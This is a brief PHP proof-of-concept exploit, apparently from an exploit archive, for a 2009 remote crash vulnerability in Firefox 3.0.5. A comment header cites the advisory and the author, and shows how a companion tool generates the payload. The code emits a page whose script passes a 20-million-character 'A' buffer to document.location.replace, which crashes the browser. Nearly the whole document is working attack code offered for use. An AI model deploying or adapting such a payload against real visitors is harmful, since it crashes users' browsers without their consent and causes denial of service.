<?php
/*
* Mozilla Firefox 3.0.5 Remote Crash Vulnerabilities
*
* Advisory: http://www.brettgervasoni.com/advisory/45/
* Released: 01/01/2009
* Test box: Windows Vista SP1 English
*
* Sending a huge buffer to either of the below properties
* results in a crash:
* document.location.replace('http://BUFFER');
* window.location='http://BUFFER';
*
* Use below code, or grab yourself a copy of sb.php
* r0ut3r@:~/public_html> php sb.php -g 20000000 -os source.html
* [i] Wrote to file: loaded.html
*
* SB: http://www.brettgervasoni.com/download/5/
*
*
* Written and discovered by:
* r0ut3r (writ3r [at] gmail.com / www.brettgervasoni.com)
*/

$data = "<script>";
$data .= "document.location.replace('http://";
$data .= str_repeat('A', 20000000);
$data .= "'); </script>";

echo $data;
?>